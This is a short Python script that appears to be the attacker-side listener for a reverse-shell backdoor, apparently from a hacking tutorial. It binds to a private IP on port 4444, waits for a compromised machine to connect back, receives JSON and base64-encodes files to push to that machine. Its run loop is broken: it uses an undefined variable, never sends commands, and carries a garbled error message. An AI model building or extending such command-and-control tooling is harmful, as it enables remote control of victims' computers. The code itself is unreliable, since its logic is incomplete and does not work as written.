#!/usr/bin/env python

import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connection")
        self.connection, address = listener.accept()
        print("[+] Connection detected from " + str(address))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:

            try:
                file_content = self.read_file(command[1])
            except Exception:
                result = "[-] Error during stream execution"


my_listener = Listener("192.168.43.157", 4444)
my_listener.run()